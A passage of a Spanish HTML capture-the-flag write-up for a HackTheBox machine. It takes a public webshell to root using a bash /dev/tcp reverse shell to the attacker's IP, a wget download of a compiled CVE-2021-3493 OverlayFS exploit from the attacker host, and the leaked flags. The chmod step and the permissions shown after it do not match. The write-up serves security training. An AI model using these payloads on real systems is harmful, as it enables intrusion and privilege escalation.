+        <p>Nmap reveló dos puertos abiertos. Lo más llamativo es el <strong>título HTTP del puerto 80: "HackTheBox WebShell"</strong>. Esto indica que ya hay una webshell instalada y accesible públicamente — el vector de ataque principal está servido en bandeja. SSH en el 22 existe pero no tenemos credenciales aún.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">CONVERSIÓN DEL REPORTE NMAP A HTML</span>
+      </div>
+      <div class="prose">
+        <p>
+          El archivo <span class="hl-cyan">overlay.xml</span> que generó Nmap está en formato XML
+          crudo, lo que lo hace difícil de leer. La herramienta <strong>xsltproc</strong> permite
+          transformar ese XML en un reporte HTML visualmente legible usando la hoja de estilos
+          oficial de Nmap. El resultado es un archivo <span class="hl">overlay.html</span>
+          que se puede abrir en cualquier navegador y muestra los resultados del scan de forma
+          organizada y con colores. Es una buena práctica para documentar y revisar scans largos.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl overlay.xml > overlay.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">overlay.xml</span> &gt; <span class="arg">overlay.html</span></span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- WEBSHELL -->
+    <div class="section" id="webshell">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">WebShell &amp; Enumeración Inicial</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">ACCESO A LA WEBSHELL — whoami</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al ingresar al <span class="hl-cyan">puerto 80</span> desde el navegador, se encuentra
+          la interfaz de la <strong>WebShell de HackTheBox</strong>: una aplicación web que tiene
+          un campo de texto para ingresar comandos y un botón "Execute" que los corre directamente
+          en el servidor. Esto representa una vulnerabilidad crítica conocida como
+          <strong>Remote Code Execution (RCE)</strong> — ejecución remota de código sin necesidad
+          de autenticación.
+        </p>
+        <p>
+          El primer comando que siempre se ejecuta en esta situación es <span class="hl-cyan">whoami</span>,
+          que devuelve el nombre del usuario bajo el cual está corriendo el proceso del servidor web.
+          El resultado es <span class="hl">www-data</span> — el usuario estándar de Apache en Ubuntu.
+          Este usuario tiene permisos limitados en el sistema, pero es nuestro punto de entrada.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="whoami">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">WEBSHELL</span>
+        <div><span class="prompt">webshell $ </span><span class="cmd">whoami</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">www-data</span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// ¿QUÉ ES www-data?</p>
+        <p><strong>www-data</strong> es el usuario del sistema operativo bajo el cual corre Apache (y otros servidores web) en distribuciones Debian/Ubuntu. Por seguridad, los servidores web no corren como root — si fueran comprometidos, el atacante solo tendría los permisos limitados de www-data. Sin embargo, ese acceso es suficiente para leer archivos del sistema, establecer una reverse shell y buscar caminos para escalar privilegios.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">LEER LA FLAG DE USUARIO — cat user.txt</span>
+      </div>
+      <div class="prose">
+        <p>
+          Sabiendo que el usuario del sistema es <span class="hl">www-data</span>, se puede deducir
+          que debe existir otro usuario real en el sistema con una flag CTF. En HackTheBox, las
+          flags de usuario se encuentran típicamente en <span class="hl-cyan">/home/&lt;usuario&gt;/user.txt</span>.
+          La WebShell permite explorar libremente el sistema de archivos, por lo que se puede
+          intentar leer el directorio <span class="hl-cyan">/home/</span> para descubrir qué usuarios
+          existen, o ir directamente si ya se tiene una pista del nombre.
+        </p>
+        <p>
+          En este caso, sabemos que el usuario es <span class="hl">constantine</span> (visible al
+          explorar <span class="hl-cyan">/home/</span>). El comando
+          <span class="hl-cyan">cat /home/constantine/user.txt</span> lee el contenido de ese archivo
+          directamente. Que www-data pueda leer la home de constantine indica que los permisos
+          del directorio son más permisivos de lo habitual — algo común en máquinas CTF.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat /home/constantine/user.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">USER FLAG</span>
+        <div><span class="prompt">webshell $ </span><span class="cmd">cat <span class="arg">/home/constantine/user.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">2c0477a3ad5052f680217c5c2209ca5c</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USER FLAG</div>
+          <div class="cred-val">2c0477a3ad5052f680217c5c2209ca5c</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">USUARIO</div>
+          <div class="cred-val">constantine</div>
+        </div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">IDENTIFICAR EL KERNEL — uname -a</span>
+      </div>
+      <div class="prose">
+        <p>
+          Para planificar la escalada de privilegios, es crucial conocer la versión exacta del
+          kernel de Linux. El comando <span class="hl-cyan">uname -a</span> imprime toda la
+          información del sistema: nombre del kernel, hostname, versión del kernel, fecha de
+          compilación, arquitectura del procesador, y tipo de sistema operativo.
+        </p>
+        <p>
+          La información más importante del output es <span class="hl">5.8.0-48-generic</span> y
+          <span class="hl">Ubuntu SMP</span>. Con este dato se puede buscar vulnerabilidades conocidas
+          para esa versión específica del kernel. Una búsqueda rápida revela que
+          <span class="hl-red">CVE-2021-3493</span> afecta exactamente a kernels de Ubuntu 20.04
+          en versiones anteriores a la corrección, incluyendo el 5.8.0-48.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="uname -a">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">KERNEL INFO</span>
+        <div><span class="prompt">webshell $ </span><span class="cmd">uname <span class="flag">-a</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-yellow">Linux overlay 5.8.0-48-generic #54~20.04.1-Ubuntu SMP Sat Mar 20 13:40:25 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REVERSE SHELL -->
+    <div class="section" id="revshell">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Reverse Shell</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Aunque la WebShell permite ejecutar comandos, tiene limitaciones importantes: no es
+          interactiva, no tiene un TTY real, y cada comando se ejecuta de forma aislada sin
+          estado persistente. Para trabajar cómodamente — subir archivos, ejecutar exploits,
+          navegar el sistema — se necesita una <strong>reverse shell</strong>: una conexión
+          de red desde la máquina víctima hacia nuestra Kali, que nos da una terminal completa.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">ABRIR PUERTO DE ESCUCHA CON NETCAT</span>
+      </div>
+      <div class="prose">
+        <p>
+          En nuestra máquina Kali, se usa <strong>Netcat (nc)</strong> para abrir un
+          <em>listener</em> — un puerto que espera conexiones entrantes. Las flags usadas son:
+          <span class="hl-cyan">-l</span> (modo escucha / listen),
+          <span class="hl-cyan">-v</span> (verbose, muestra información detallada),
+          <span class="hl-cyan">-n</span> (no resolver DNS, solo IPs numéricas) y
+          <span class="hl-cyan">-p 443</span> (escuchar en el puerto 443).
+        </p>
+        <p>
+          Se eligió el <span class="hl">puerto 443</span> estratégicamente: es el puerto estándar
+          de HTTPS y muchos firewalls permiten tráfico saliente en él sin inspeccionarlo, lo que
+          hace que la reverse shell sea menos probable de ser bloqueada por reglas de firewall
+          de la red objetivo.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nc -lvnp 443">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LISTENER (KALI)</span>
+        <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>listening on [any] <span class="o-cyan">443</span> ...</div>
+        <div><span class="o-green">connect to [10.10.16.5] from (UNKNOWN) [10.129.5.243] 34900</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">EJECUTAR LA REVERSE SHELL DESDE LA WEBSHELL</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el listener activo en nuestra Kali, se ejecuta el payload de reverse shell en la
+          WebShell. El comando usa <strong>bash</strong> para abrir una shell interactiva
+          (<span class="hl-cyan">bash -i</span>) y redirigir sus entradas/salidas/errores
+          (<span class="hl-cyan">&gt;&amp;</span>) hacia un socket TCP apuntando a nuestra IP en el
+          puerto 443. El <span class="hl-cyan">0&gt;&amp;1</span> al final redirige también la
+          entrada estándar (stdin), completando la comunicación bidireccional.
+        </p>
+        <p>
+          Es importante reemplazar <span class="hl">TU_IP</span> con la IP de tu interfaz VPN de
+          HackTheBox (la que obtienes al conectarte con OpenVPN). Cuando se ejecuta este comando
+          en la WebShell, la página quedará cargando en bucle — eso es normal y significa que
+          la conexión fue establecida exitosamente hacia nuestra Kali.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="bash -c 'bash -i >& /dev/tcp/10.10.16.5/443 0>&1'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">WEBSHELL → PAYLOAD</span>
+        <div><span class="prompt">webshell $ </span><span class="cmd">bash <span class="flag">-c</span> <span class="arg">'bash -i &gt;&amp; /dev/tcp/<span style="color:var(--red)">TU_IP</span>/<span style="color:var(--red)">443</span> 0&gt;&amp;1'</span></span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿CÓMO FUNCIONA /dev/tcp?</p>
+        <p>En Bash, <strong>/dev/tcp/HOST/PUERTO</strong> es un pseudo-dispositivo especial que, al abrirse, crea una conexión TCP hacia HOST:PUERTO. No es un archivo real en disco — Bash lo interpreta internamente. Al redirigir stdin/stdout/stderr hacia este pseudo-dispositivo, toda la comunicación de la shell viaja por la red hacia nuestra máquina atacante.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- CVE -->
+    <div class="section" id="cve">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">CVE-2021-3493 — OverlayFS LPE</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Con la información del kernel obtenida (<span class="hl">5.8.0-48-generic, Ubuntu 20.04</span>),
+          se identifica que el sistema es vulnerable a <span class="hl-red">CVE-2021-3493</span>.
+          Esta vulnerabilidad es un <strong>Local Privilege Escalation (LPE)</strong> — no permite
+          acceso inicial, pero una vez dentro del sistema como usuario sin privilegios, permite
+          escalar a <span class="hl-red">root</span>.
+        </p>
+      </div>
+
+      <div class="cve-box">
+        <p class="cve-box-title">// CVE-2021-3493 — DETALLES TÉCNICOS</p>
+        <p><strong>Nombre:</strong> Ubuntu OverlayFS Local Privilege Escalation<br><br>
+        <strong>Descripción:</strong> OverlayFS es un sistema de archivos de unión (union mount) del kernel de Linux que permite superponer múltiples directorios en uno solo. La vulnerabilidad surge porque el kernel de Ubuntu permitía que usuarios sin privilegios crearan <em>user namespaces</em> (namespaces de usuario) y dentro de ellos montaran filesystems overlay sin restricciones. Al hacer esto, un proceso puede establecer capacidades de archivo (file capabilities) en un filesystem overlay y luego, al ejecutar ese binario fuera del namespace, esas capacidades se heredan con los privilegios del sistema real, permitiendo obtener root.<br><br>
+        <strong>Versiones afectadas:</strong> Ubuntu 20.10, Ubuntu 20.04 LTS, Ubuntu 19.04, Ubuntu 18.04 LTS, Ubuntu 18.04 ESM, Ubuntu 16.04 LTS, Ubuntu 16.04 ESM, Ubuntu 14.04 ESM<br><br>
+        <strong>Repositorio del exploit:</strong> github.com/briskets/CVE-2021-3493</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">CLONAR EL REPOSITORIO DEL EXPLOIT</span>
+      </div>
+      <div class="prose">
+        <p>
+          El exploit público fue desarrollado por <strong>briskets</strong> y está disponible en
+          GitHub. Se clona con <span class="hl-cyan">git clone</span> en nuestra máquina Kali, lo
+          que descarga el código fuente del exploit (<span class="hl">exploit.c</span>) junto con
+          el README de instrucciones. El repositorio es pequeño (16 objetos, ~5.58 KiB) y se
+          descarga casi instantáneamente.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="git clone https://github.com/briskets/CVE-2021-3493/">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">GIT (KALI)</span>
+        <div><span class="prompt">$ </span><span class="cmd">git clone <span class="arg">https://github.com/briskets/CVE-2021-3493/</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Cloning into 'CVE-2021-3493'...</div>
+        <div>remote: Enumerating objects: 16, done.</div>
+        <div>remote: Counting objects: 100% (16/16), done.</div>
+        <div>remote: Compressing objects: 100% (13/13), done.</div>
+        <div><span class="o-green">Receiving objects: 100% (16/16), 5.58 KiB | 5.58 MiB/s, done.</span></div>
+        <div>Resolving deltas: 100% (2/2), done.</div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">$ </span>ls</div>
+        <div><span class="o-cyan">CVE-2021-3493</span>&nbsp;&nbsp; overlay.html&nbsp;&nbsp; overlay.xml&nbsp;&nbsp; 'WriteUp Overlay.odt'</div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- EXPLOIT -->
+    <div class="section" id="exploit">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Compilar y Transferir el Exploit</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">COMPILAR CON GCC — BINARIO ESTÁTICO</span>
+      </div>
+      <div class="prose">
+        <p>
+          El exploit está escrito en C (<span class="hl-cyan">exploit.c</span>) y necesita ser
+          compilado antes de poder ejecutarse. El README original indica usar
+          <code style="color:var(--yellow)">gcc exploit.c -o exploit</code>, pero en versiones
+          modernas de Kali esto puede fallar al ejecutar el binario en la máquina víctima porque
+          las bibliotecas compartidas (shared libraries) de ambos sistemas pueden ser incompatibles.
+        </p>
+        <p>
+          La solución es compilar con la flag <span class="hl-cyan">-static</span>, que instruye
+          a GCC a incluir <strong>todas las bibliotecas necesarias dentro del propio binario</strong>,
+          creando un ejecutable que no depende de ninguna librería externa del sistema. Este binario
+          "estático" puede ejecutarse en cualquier sistema Linux x86_64, independientemente de las
+          versiones de glibc instaladas.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="gcc -static exploit.c -o exploit-static">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">COMPILAR (KALI)</span>
+        <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">CVE-2021-3493</span> &amp;&amp; gcc <span class="flag">-static</span> <span class="arg">exploit.c</span> <span class="flag">-o</span> <span class="arg">exploit-static</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="prompt">$ </span>ls</div>
+        <div><span class="o-green">exploit-static</span>&nbsp;&nbsp; exploit.c&nbsp;&nbsp; ovlcap&nbsp;&nbsp; README.md</div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// ¿POR QUÉ -static Y NO EL COMANDO ORIGINAL?</p>
+        <p>Las versiones modernas de Kali Linux tienen bibliotecas más nuevas que las de Ubuntu 20.04. Si compilamos dinámicamente, el binario busca en tiempo de ejecución versiones específicas de glibc que pueden no existir o ser incompatibles en la víctima. Con <strong>-static</strong>, todo va empaquetado dentro del binario — el tamaño sube (~834KB vs ~20KB), pero funciona garantizadamente en cualquier Linux x86_64.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">SERVIDOR HTTP PARA TRANSFERIR EL EXPLOIT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Para transferir el exploit compilado desde nuestra Kali hacia la máquina víctima, se
+          levanta un servidor HTTP temporal con Python. El comando
+          <span class="hl-cyan">python3 -m http.server 8000</span> inicia un servidor web
+          minimalista que sirve todos los archivos del directorio actual en el puerto 8000.
+        </p>
+        <p>
+          Es imprescindible ejecutar este comando desde <strong>dentro del directorio</strong>
+          donde está <span class="hl">exploit-static</span> (es decir, dentro de
+          <span class="hl-cyan">CVE-2021-3493/</span>), para que ese archivo sea accesible
+          por HTTP. En el output se puede ver cómo la máquina víctima (10.129.5.243) descarga
+          el archivo con una petición GET exitosa (código 200).
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="python3 -m http.server 8000">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">HTTP SERVER (KALI)</span>
+        <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-m</span> <span class="arg">http.server</span> <span class="arg">8000</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</div>
+        <div><span class="o-green">10.129.5.243 - - [18/May/2026 12:44:40] "GET /exploit-static HTTP/1.1" 200 -</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">DESCARGAR EL EXPLOIT EN LA VÍCTIMA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Desde la reverse shell activa en la máquina víctima, se descarga el exploit usando
+          <span class="hl-cyan">wget</span>. Este comando realiza una petición HTTP GET hacia
+          nuestra Kali (10.10.16.5 en el puerto 8000) y descarga el archivo
+          <span class="hl">exploit-static</span> guardándolo en el directorio actual
+          (<span class="hl-cyan">/tmp/</span>). Se usa <span class="hl-cyan">/tmp/</span> porque
+          es el único directorio donde <strong>www-data tiene permisos de escritura</strong>
+          garantizados en cualquier sistema Linux.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="wget http://10.10.16.5:8000/exploit-static">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VÍCTIMA (/tmp)</span>
+        <div><span class="prompt">www-data@overlay:/tmp$ </span><span class="cmd">wget <span class="arg">http://10.10.16.5:8000/exploit-static</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>--2026-05-18 16:44:37--  http://10.10.16.5:8000/exploit-static</div>
+        <div>Connecting to 10.10.16.5:8000... connected.</div>
+        <div>HTTP request sent, awaiting response... <span class="o-green">200 OK</span></div>
+        <div>Length: 834240 (815K) [application/octet-stream]</div>
+        <div>Saving to: 'exploit-static'</div>
+        <div>&nbsp;</div>
+        <div>800K ..........<span class="o-green"> 100% 49.9K=3.4s</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">2026-05-18 16:44:41 (242 KB/s) - 'exploit-static' saved [834240/834240]</span></div>
+        <div>&nbsp;</div>
+        <div><span class="prompt">www-data@overlay:/tmp$ </span>ls</div>
+        <div><span class="o-cyan">exploit-static</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">DAR PERMISOS DE EJECUCIÓN</span>
+      </div>
+      <div class="prose">
+        <p>
+          Los archivos descargados por defecto no tienen permisos de ejecución en Linux.
+          El comando <span class="hl-cyan">chmod +x exploit-static</span> (equivalente a
+          <span class="hl-cyan">chmod +7777</span> en este writeup, aunque el valor correcto
+          estándar sería <span class="hl-cyan">chmod +x</span> o <span class="hl-cyan">chmod 755</span>)
+          añade el bit de ejecución al binario, permitiendo que el sistema operativo lo ejecute
+          como un programa. Sin este paso, el intento de correr <span class="hl-cyan">./exploit-static</span>
+          resultaría en un error de "Permission denied".
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="chmod +x exploit-static">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VÍCTIMA</span>
+        <div><span class="prompt">www-data@overlay:/tmp$ </span><span class="cmd">chmod <span class="flag">+x</span> <span class="arg">exploit-static</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="prompt">www-data@overlay:/tmp$ </span>ls -la</div>
+        <div>total 824</div>
+        <div>drwxrwxrwt 2 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp; 4096 May 18 16:44 .</div>
+        <div>drwxr-xr-x 20 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp; 4096 Dec 29  2022 ..</div>
+        <div><span class="o-green">-rwsrwsrwt 1 www-data www-data 834240 May 18 16:43 exploit-static</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- PRIVESC -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Escalada de Privilegios a Root</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">14</div>
+        <span class="step-title">EJECUTAR EL EXPLOIT — ROOT SHELL</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el exploit en la víctima y con permisos de ejecución, simplemente se ejecuta
+          con <span class="hl-cyan">./exploit-static</span>. El exploit aprovecha la vulnerabilidad
+          CVE-2021-3493: crea un namespace de usuario no privilegiado, monta un filesystem OverlayFS
+          dentro de él, establece file capabilities en un binario dentro del overlay, y luego
+          ejecuta ese binario fuera del namespace, heredando los privilegios del kernel real.
+        </p>
+        <p>
+          Los mensajes de error que aparecen al inicio (<em>"bash: cannot set terminal process group"</em>,
+          <em>"bash: no job control in this shell"</em>) son normales e inofensivos — indican que
+          la shell no tiene un TTY completo asociado, pero no afectan la funcionalidad.
+          Lo importante es verificar la identidad con <span class="hl-cyan">whoami</span>,
+          que ahora devuelve <span class="hl-red">root</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="./exploit-static">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PRIVESC</span>
+        <div><span class="prompt">www-data@overlay:/tmp$ </span><span class="cmd">./exploit-static</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>./exploit-static</div>
+        <div class="o-yellow">bash: cannot set terminal process group (909): Inappropriate ioctl for device</div>
+        <div class="o-yellow">bash: no job control in this shell</div>
+        <div><span class="prompt-root">bash-5.0# </span>whoami</div>
+        <div>whoami</div>
+        <div><span class="o-red" style="font-weight:bold;font-size:1rem;">root</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿QUÉ HACE EL EXPLOIT INTERNAMENTE?</p>
+        <p>El exploit <strong>explota cómo Ubuntu permite namespaces de usuario no privilegiados</strong>: (1) Crea un user namespace donde el proceso actual aparece como "root" dentro de ese namespace aislado. (2) Dentro del namespace, monta un filesystem OverlayFS sobre un directorio temporal. (3) Crea un ejecutable en el overlay y le asigna file capabilities elevadas (como CAP_SETUID). (4) Al ejecutar ese binario <strong>fuera del namespace</strong>, el kernel hereda las capabilities sin sanitizarlas correctamente, otorgando privilegios reales de root al proceso.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- FLAGS -->
+    <div class="section" id="flags">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Flags &amp; Root</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">15</div>
+        <span class="step-title">OBTENER LA FLAG DE ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Siendo <span class="hl-red">root</span>, se navega al directorio
+          <span class="hl-cyan">/root/</span> — el directorio home del superusuario, al que
+          normalmente solo root tiene acceso. Dentro se listan los archivos con
+          <span class="hl-cyan">ls</span> y se lee la flag con
+          <span class="hl-cyan">cat root.txt</span>. Esta es la flag final que confirma la
+          máquina completamente comprometida.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd /root && ls && cat root.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">ROOT FLAG</span>
+        <div><span class="prompt-root">bash-5.0# </span><span class="cmd">cd <span class="arg">/root</span></span></div>
+        <div><span class="prompt-root">bash-5.0# </span><span class="cmd">ls</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>root.txt&nbsp;&nbsp; snap</div>
+        <div><span class="prompt-root">bash-5.0# </span>cat root.txt</div>
+        <div><span class="o-red" style="font-weight:bold;">9672951ae7d8d02e77e9870f3b60bb21</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USER FLAG</div>
+          <div class="cred-val">2c0477a3ad5052f680217c5c2209ca5c</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">ROOT FLAG</div>
+          <div class="cred-val" style="color:var(--red);">9672951ae7d8d02e77e9870f3b60bb21</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA DE COMANDOS -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">ping</div>
+          <div class="cmd-ref-syntax">ping [IP] -c [N]</div>
+          <div class="cmd-ref-desc">Verifica conectividad con un host enviando paquetes ICMP. El TTL de respuesta revela el sistema operativo del objetivo.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-c N</span> &mdash; Limita el envío a N paquetes (evita ping infinito)</li>
+            <li><span>-t</span> &mdash; TTL a usar en los paquetes enviados</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap [flags] [IP]</div>
+          <div class="cmd-ref-desc">Escáner de red para descubrir hosts, puertos abiertos, servicios y versiones. Esencial en reconocimiento.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> &mdash; Escanea los 65,535 puertos TCP</li>
+            <li><span>-sS</span> &mdash; SYN scan sigiloso (half-open)</li>
+            <li><span>-sC</span> &mdash; Ejecuta scripts NSE por defecto</li>
+            <li><span>-sV</span> &mdash; Detecta versiones de servicios</li>
+            <li><span>-n</span> &mdash; Sin resolución DNS (más rápido)</li>
+            <li><span>-Pn</span> &mdash; Omite host discovery (asume activo)</li>
+            <li><span>--min-rate=5000</span> &mdash; Mínimo 5000 pkts/segundo</li>
+            <li><span>--open</span> &mdash; Muestra solo puertos abiertos</li>
+            <li><span>-oX archivo</span> &mdash; Guarda resultado en XML</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">xsltproc</div>
+          <div class="cmd-ref-syntax">xsltproc [xsl] [xml] > [html]</div>
+          <div class="cmd-ref-desc">Transforma documentos XML usando hojas de estilo XSL. Usado para convertir el output XML de Nmap en un reporte HTML legible.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>nmap.xsl</span> &mdash; Hoja de estilo oficial de Nmap</li>
+            <li><span>&gt; archivo</span> &mdash; Redirige la salida a un archivo</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nc (netcat)</div>
+          <div class="cmd-ref-syntax">nc -lvnp [puerto]</div>
+          <div class="cmd-ref-desc">Navaja suiza de redes. En modo listener espera conexiones entrantes (reverse shells). También puede conectarse a puertos, transferir datos, etc.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> &mdash; Modo escucha (listen)</li>
+            <li><span>-v</span> &mdash; Verbose (muestra detalles)</li>
+            <li><span>-n</span> &mdash; Solo IPs numéricas, sin DNS</li>
+            <li><span>-p N</span> &mdash; Puerto en el que escuchar</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">bash reverse shell</div>
+          <div class="cmd-ref-syntax">bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'</div>
+          <div class="cmd-ref-desc">Payload para obtener una reverse shell usando Bash. Redirige stdin/stdout/stderr de una shell interactiva hacia un socket TCP remoto.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-i</span> &mdash; Shell interactiva</li>
+            <li><span>&gt;&amp;</span> &mdash; Redirige stdout y stderr juntos</li>
+            <li><span>/dev/tcp/IP/PORT</span> &mdash; Pseudo-dispositivo TCP de Bash</li>
+            <li><span>0&gt;&amp;1</span> &mdash; Redirige stdin al mismo descriptor</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">uname</div>
+          <div class="cmd-ref-syntax">uname -a</div>
+          <div class="cmd-ref-desc">Imprime información del sistema operativo y del kernel. Crítico para identificar versiones vulnerables y planificar la escalada de privilegios.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-a</span> &mdash; Todo: kernel, hostname, versión, arquitectura</li>
+            <li><span>-r</span> &mdash; Solo la versión del kernel</li>
+            <li><span>-m</span> &mdash; Solo la arquitectura de hardware</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">git clone</div>
+          <div class="cmd-ref-syntax">git clone [URL]</div>
+          <div class="cmd-ref-desc">Descarga un repositorio Git completo (código fuente, historial, ramas) desde una URL remota a un directorio local.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>--depth 1</span> &mdash; Clona solo el último commit (más rápido)</li>
+            <li><span>-b rama</span> &mdash; Clona una rama específica</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">gcc</div>
+          <div class="cmd-ref-syntax">gcc [flags] [archivo.c] -o [output]</div>
+          <div class="cmd-ref-desc">Compilador de C de GNU. Convierte código fuente C en un ejecutable binario. Fundamental para compilar exploits escritos en C.</div>
+          <ul class="cmd-ref-flags">
